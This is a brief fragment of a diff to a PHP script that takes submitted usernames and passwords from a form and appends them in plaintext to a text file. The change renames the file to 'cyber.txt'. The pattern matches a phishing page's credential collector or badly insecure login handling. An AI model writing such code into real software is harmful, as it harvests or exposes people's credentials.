@@ -5,7 +5,7 @@
   $username = $_POST['username'];
   $password = $_POST['password'];
   $text = $username . "," . $password . "\n";
-  $fp = fopen('data.txt', 'a+');
+  $fp = fopen('cyber.txt', 'a+');
 
     if(fwrite($fp, $text))  {
         echo
